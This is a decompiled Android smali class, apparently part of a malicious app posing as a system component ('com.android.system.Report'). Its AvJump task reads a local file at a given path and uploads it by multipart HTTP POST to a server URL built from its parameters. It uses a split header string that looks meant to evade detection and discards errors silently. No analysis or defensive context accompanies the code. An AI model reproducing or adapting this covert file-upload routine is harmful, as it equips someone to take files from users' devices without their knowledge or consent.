.class public Lcom/android/system/Report$AvJump;
.super Landroid/os/AsyncTask;
.source "Report.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/android/system/Report;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "AvJump"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/String;",
        "Ljava/lang/Void;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/system/Report;


# direct methods
.method public constructor <init>(Lcom/android/system/Report;)V
    .locals 0

    .prologue
    .line 76
    iput-object p1, p0, Lcom/android/system/Report$AvJump;->this$0:Lcom/android/system/Report;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method

.method private GetFile(Ljava/lang/String;)Ljava/io/FileInputStream;
    .locals 2
    .param p1, "params"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/FileNotFoundException;
        }
    .end annotation

    .prologue
    .line 167
    new-instance v0, Ljava/io/FileInputStream;

    new-instance v1, Ljava/io/File;

    invoke-direct {v1, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    return-object v0
.end method

.method private closeConnect(Ljava/io/DataInputStream;)V
    .locals 0
    .param p1, "inStream"    # Ljava/io/DataInputStream;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 162
    invoke-virtual {p1}, Ljava/io/DataInputStream;->close()V

    .line 163
    return-void
.end method


# virtual methods
.method protected bridge varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 1
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/android/system/Report$AvJump;->doInBackground([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/String;
    .locals 23
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    .line 81
    new-instance v20, Ljava/lang/StringBuilder;

    const/16 v21, 0x2

    aget-object v21, p1, v21

    const-string v22, "?a=3"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v21

    invoke-static/range {v21 .. v21}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v21

    invoke-direct/range {v20 .. v21}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v21, 0x0

    aget-object v21, p1, v21

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    .line 84
    .local v19, "urlString":Ljava/lang/String;
    const/4 v9, 0x0

    .line 85
    .local v9, "conn":Ljava/net/HttpURLConnection;
    const/4 v10, 0x0

    .line 86
    .local v10, "dos":Ljava/io/DataOutputStream;
    const/4 v13, 0x0

    .line 88
    .local v13, "inStream":Ljava/io/DataInputStream;
    const-string v15, "\r\n"

    .line 89
    .local v15, "lineEnd":Ljava/lang/String;
    const-string v17, "--"

    .line 90
    .local v17, "twoHyphens":Ljava/lang/String;
    const-string v3, "*****"

    .line 91
    .local v3, "boundary":Ljava/lang/String;
    const/high16 v16, 0x100000

    .line 92
    .local v16, "maxBufferSize":I
    const/16 v20, 0x1

    aget-object v2, p1, v20

    .line 96
    .local v2, "AAA":Ljava/lang/String;
    :try_start_0
    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/android/system/Report$AvJump;->GetFile(Ljava/lang/String;)Ljava/io/FileInputStream;

    move-result-object v12

    .line 98
    .local v12, "fileInputStream":Ljava/io/FileInputStream;
    new-instance v18, Ljava/net/URL;

    invoke-direct/range {v18 .. v19}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 100
    .local v18, "url":Ljava/net/URL;
    invoke-virtual/range {v18 .. v18}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v20

    move-object/from16 v0, v20

    check-cast v0, Ljava/net/HttpURLConnection;

    move-object v9, v0

    .line 101
    const/16 v20, 0x1

    move/from16 v0, v20

    invoke-virtual {v9, v0}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    .line 102
    const/16 v20, 0x1

    move/from16 v0, v20

    invoke-virtual {v9, v0}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 103
    const/16 v20, 0x0

    move/from16 v0, v20

    invoke-virtual {v9, v0}, Ljava/net/HttpURLConnection;->setUseCaches(Z)V

    .line 105
    const-string v20, "POST"

    move-object/from16 v0, v20

    invoke-virtual {v9, v0}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 106
    const-string v20, "Connection"

    const-string v21, "Keep-Alive"

    move-object/from16 v0, v20

    move-object/from16 v1, v21

    invoke-virtual {v9, v0, v1}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 107
    const-string v20, "Content-Type"

    new-instance v21, Ljava/lang/StringBuilder;

    const-string v22, "multipart/form-data;boundary="

    invoke-direct/range {v21 .. v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v21

    move-object/from16 v0, v20

    move-object/from16 v1, v21

    invoke-virtual {v9, v0, v1}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 109
    new-instance v11, Ljava/io/DataOutputStream;

    invoke-virtual {v9}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v20

    move-object/from16 v0, v20

    invoke-direct {v11, v0}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V
    :try_end_0
    .catch Ljava/net/MalformedURLException; {:try_start_0 .. :try_end_0} :catch_4
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 110
    .end local v10    # "dos":Ljava/io/DataOutputStream;
    .local v11, "dos":Ljava/io/DataOutputStream;
    :try_start_1
    new-instance v20, Ljava/lang/StringBuilder;

    invoke-static/range {v17 .. v17}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v21

    invoke-direct/range {v20 .. v21}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v20

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    move-object/from16 v0, v20

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, v20

    invoke-virtual {v11, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 112
    const-string v20, "Conten"

    const-string v21, "t-Disposition"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v20

    new-instance v21, Ljava/lang/StringBuilder;

    const-string v22, ": form-data; name=\'TEMP\'; filename=\'"

    invoke-direct/range {v21 .. v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v21

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    const-string v22, "\'"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v21

    invoke-virtual/range {v20 .. v21}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, v20

    invoke-virtual {v11, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 113
    invoke-virtual {v11, v15}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 115
    invoke-virtual {v12}, Ljava/io/FileInputStream;->available()I

    move-result v6

    .line 116
    .local v6, "bytesAvailable":I
    move/from16 v0, v16

    invoke-static {v6, v0}, Ljava/lang/Math;->min(II)I

    move-result v5

    .line 117
    .local v5, "bufferSize":I
    new-array v4, v5, [B

    .line 118
    .local v4, "buffer":[B
    const/16 v20, 0x0

    move/from16 v0, v20

    invoke-virtual {v12, v4, v0, v5}, Ljava/io/FileInputStream;->read([BII)I

    move-result v7

    .line 120
    .local v7, "bytesRead":I
    :goto_0
    if-gtz v7, :cond_0

    .line 129
    invoke-virtual {v11, v15}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 130
    new-instance v20, Ljava/lang/StringBuilder;

    invoke-static/range {v17 .. v17}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v21

    invoke-direct/range {v20 .. v21}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v20

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    move-object/from16 v0, v20

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    move-object/from16 v0, v20

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, v20

    invoke-virtual {v11, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 132
    invoke-virtual {v9}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v8

    .line 136
    .local v8, "c":I
    invoke-virtual {v12}, Ljava/io/FileInputStream;->close()V

    .line 137
    invoke-virtual {v11}, Ljava/io/DataOutputStream;->flush()V

    .line 138
    invoke-virtual {v11}, Ljava/io/DataOutputStream;->close()V
    :try_end_1
    .catch Ljava/net/MalformedURLException; {:try_start_1 .. :try_end_1} :catch_5
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_3

    .line 140
    const-string v20, ""

    move-object v10, v11

    .line 157
    .end local v4    # "buffer":[B
    .end local v5    # "bufferSize":I
    .end local v6    # "bytesAvailable":I
    .end local v7    # "bytesRead":I
    .end local v8    # "c":I
    .end local v11    # "dos":Ljava/io/DataOutputStream;
    .end local v12    # "fileInputStream":Ljava/io/FileInputStream;
    .end local v18    # "url":Ljava/net/URL;
    .restart local v10    # "dos":Ljava/io/DataOutputStream;
    :goto_1
    return-object v20

    .line 122
    .end local v10    # "dos":Ljava/io/DataOutputStream;
    .restart local v4    # "buffer":[B
    .restart local v5    # "bufferSize":I
    .restart local v6    # "bytesAvailable":I
    .restart local v7    # "bytesRead":I
    .restart local v11    # "dos":Ljava/io/DataOutputStream;
    .restart local v12    # "fileInputStream":Ljava/io/FileInputStream;
    .restart local v18    # "url":Ljava/net/URL;
    :cond_0
    const/16 v20, 0x0

    :try_start_2
    move/from16 v0, v20

    invoke-virtual {v11, v4, v0, v5}, Ljava/io/DataOutputStream;->write([BII)V

    .line 123
    invoke-virtual {v12}, Ljava/io/FileInputStream;->available()I

    move-result v6

    .line 124
    move/from16 v0, v16

    invoke-static {v6, v0}, Ljava/lang/Math;->min(II)I

    move-result v5

    .line 125
    const/16 v20, 0x0

    move/from16 v0, v20

    invoke-virtual {v12, v4, v0, v5}, Ljava/io/FileInputStream;->read([BII)I
    :try_end_2
    .catch Ljava/net/MalformedURLException; {:try_start_2 .. :try_end_2} :catch_5
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_3

    move-result v7

    goto :goto_0

    .line 146
    .end local v4    # "buffer":[B
    .end local v5    # "bufferSize":I
    .end local v6    # "bytesAvailable":I
    .end local v7    # "bytesRead":I
    .end local v11    # "dos":Ljava/io/DataOutputStream;
    .end local v12    # "fileInputStream":Ljava/io/FileInputStream;
    .end local v18    # "url":Ljava/net/URL;
    .restart local v10    # "dos":Ljava/io/DataOutputStream;
    :catch_0
    move-exception v20

    .line 150
    :goto_2
    :try_start_3
    new-instance v14, Ljava/io/DataInputStream;

    invoke-virtual {v9}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v20

    move-object/from16 v0, v20

    invoke-direct {v14, v0}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_1

    .line 151
    .end local v13    # "inStream":Ljava/io/DataInputStream;
    .local v14, "inStream":Ljava/io/DataInputStream;
    :try_start_4
    move-object/from16 v0, p0

    invoke-direct {v0, v14}, Lcom/android/system/Report$AvJump;->closeConnect(Ljava/io/DataInputStream;)V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_2

    move-object v13, v14

    .line 157
    .end local v14    # "inStream":Ljava/io/DataInputStream;
    .restart local v13    # "inStream":Ljava/io/DataInputStream;
    :goto_3
    const/16 v20, 0x0

    goto :goto_1

    .line 154
    :catch_1
    move-exception v20

    goto :goto_3

    .end local v13    # "inStream":Ljava/io/DataInputStream;
    .restart local v14    # "inStream":Ljava/io/DataInputStream;
    :catch_2
    move-exception v20

    move-object v13, v14

    .end local v14    # "inStream":Ljava/io/DataInputStream;
    .restart local v13    # "inStream":Ljava/io/DataInputStream;
    goto :goto_3

    .line 146
    .end local v10    # "dos":Ljava/io/DataOutputStream;
    .restart local v11    # "dos":Ljava/io/DataOutputStream;
    .restart local v12    # "fileInputStream":Ljava/io/FileInputStream;
    .restart local v18    # "url":Ljava/net/URL;
    :catch_3
    move-exception v20

    move-object v10, v11

    .end local v11    # "dos":Ljava/io/DataOutputStream;
    .restart local v10    # "dos":Ljava/io/DataOutputStream;
    goto :goto_2

    .line 145
    .end local v12    # "fileInputStream":Ljava/io/FileInputStream;
    .end local v18    # "url":Ljava/net/URL;
    :catch_4
    move-exception v20

    goto :goto_2

    .end local v10    # "dos":Ljava/io/DataOutputStream;
    .restart local v11    # "dos":Ljava/io/DataOutputStream;
    .restart local v12    # "fileInputStream":Ljava/io/FileInputStream;
    .restart local v18    # "url":Ljava/net/URL;
    :catch_5
    move-exception v20

    move-object v10, v11

    .end local v11    # "dos":Ljava/io/DataOutputStream;
    .restart local v10    # "dos":Ljava/io/DataOutputStream;
    goto :goto_2
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .prologue
    .line 1
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/android/system/Report$AvJump;->onPostExecute(Ljava/lang/String;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/String;)V
    .locals 0
    .param p1, "hash"    # Ljava/lang/String;

    .prologue
    .line 172
    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    .line 176
    return-void
.end method
